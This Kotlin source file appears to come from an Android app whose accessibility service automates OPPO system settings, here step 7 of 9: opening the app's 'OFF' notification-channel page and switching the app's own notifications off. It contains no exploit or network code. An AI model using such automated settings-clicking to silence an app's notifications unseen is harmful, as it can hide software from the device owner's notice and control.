package com.storm.safe.rock.service.modules.yw5xud.oppo

import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.delay

/**
 * Step 7 -- 关 OFF 通知渠道。
 *
 * Phase E: 改用 NotificationManagerCompat.areNotificationsEnabled()
 * 真机 dumpsys 显示 OFF channel importance=2(LOW),不是 0(NONE);
 * 但 app 全局 "AppSettings: importance=NONE" 才是真实"通知已禁"状态。
 */
class OppoStep7Notification(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: OppoSteps
) {
    companion object {
        private const val TAG = "OppoStep7Notification"
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val ctx = steps.ctx
        if (OppoStepCompletionStore.isCompleted(ctx, OppoStepCompletionStore.Keys.STEP7_NOTIFICATION)) {
            logs.add("[Step 7/9] ⏭ 24h 内已完成,跳过"); return
        }
        logs.add("[Step 7/9] ▶ 关闭 OFF 通知渠道开始")
        // Call through steps to preserve test override behavior
        steps.launchChannelSettings("OFF")
        delay(800L)

        // Call through steps to preserve test override behavior
        if (steps.areAppNotificationsBlocked()) {
            logs.add("[Step 7/9] ✓ app-level 通知已禁,直接 mark")
            successes.add("[Step 7/9] 通知已禁用(app-level)")
            OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP7_NOTIFICATION)
            return
        }

        val ok = steps.tryCloseOffChannelSwitch(successes, logs)
        if (ok) {
            OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP7_NOTIFICATION)
        } else {
            failures.add("[Step 7/9] OFF 通知关闭失败")
        }
    }

    /**
     * Phase E: 检测 app-level 通知是否已禁用。
     *
     * `NotificationManagerCompat.from(ctx).areNotificationsEnabled()`:
     *   返回 false = app 被禁止发通知(app-level block)
     *   返回 true = 允许发通知(即使个别 channel 被 user 静音)
     */
    suspend fun areAppNotificationsBlocked(): Boolean {
        return try {
            val nmc = androidx.core.app.NotificationManagerCompat.from(steps.ctx)
            !nmc.areNotificationsEnabled()
        } catch (_: Exception) { false }
    }

    suspend fun launchChannelSettings(channelId: String) {
        try {
            val ctx = steps.ctx
            val i = android.content.Intent("android.settings.CHANNEL_NOTIFICATION_SETTINGS")
                .putExtra("android.provider.extra.APP_PACKAGE", ctx.packageName)
                .putExtra("android.provider.extra.CHANNEL_ID", channelId)
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
        } catch (e: CancellationException) { throw e } catch (e: Exception) {
            android.util.Log.w(TAG, "launchChannelSettings: ${e.message}")
        }
    }

    suspend fun tryCloseOffChannelSwitch(
        successes: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        repeat(6) {
            if (ui.closeSwitch("允许通知")) {
                ui.pressBack()
                successes.add("[Step 7/9] 允许通知 已关闭")
                return true
            }
            delay(500L)
        }
        return false
    }
}
